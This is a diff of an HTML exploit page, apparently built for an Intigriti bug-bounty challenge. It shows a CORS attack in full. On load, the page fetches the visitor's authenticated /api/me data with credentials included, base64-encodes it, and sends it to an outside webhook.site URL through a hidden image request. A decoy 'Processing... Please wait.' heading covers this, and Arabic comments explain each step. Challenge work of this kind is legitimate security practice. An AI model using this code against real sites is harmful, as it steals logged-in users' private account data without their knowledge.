@@ -1,24 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Exploit</title>
+    <meta charset="UTF-8">
+    <title>Exploit Page</title>
 </head>
 <body>
+    <h1>Processing... Please wait.</h1>
     <script>
-        const CHALLENGE_API = 'https://challenge-0126.intigriti.io/api/me';
-        const MY_WEBHOOK = 'https://webhook.site/720dc5e0-146a-476e-836f-84ea1bcd9dc1';
+        (function() {
+            const CHALLENGE_API = 'https://challenge-0126.intigriti.io/api/me';
+            const MY_WEBHOOK = 'https://webhook.site/720dc5e0-146a-476e-836f-84ea1bcd9dc1';
 
-        fetch(CHALLENGE_API, {
-            method: 'GET',
-            credentials: 'include' 
-        })
-        .then(response => response.json())
-        .then(data => {
-            fetch(MY_WEBHOOK + '?flag=' + btoa(JSON.stringify(data)));
-        })
-        .catch(err => {
-            fetch(MY_WEBHOOK + '?error=' + err);
-        });
+            // 1. طلب البيانات من الـ API
+            fetch(CHALLENGE_API, {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Not logged in');
+                return response.json();
+            })
+            .then(data => {
+                // 2. تحويل البيانات لنص ثم Base64
+                const encodedData = btoa(JSON.stringify(data));
+                
+                // 3. إرسال البيانات عن طريق إنشاء صورة (هذه الطريقة لا تفشل أبداً)
+                const logger = new Image();
+                logger.src = MY_WEBHOOK + '?data=' + encodedData;
+                
+                console.log('Data sent successfully!');
+            })
+            .catch(err => {
+                // في حالة الخطأ، أرسل رسالة الخطأ للـ Webhook لتعرف السبب
+                const errorLogger = new Image();
+                errorLogger.src = MY_WEBHOOK + '?error=' + btoa(err.message);
+            });
+        })();
     </script>
 </body>
 </html>
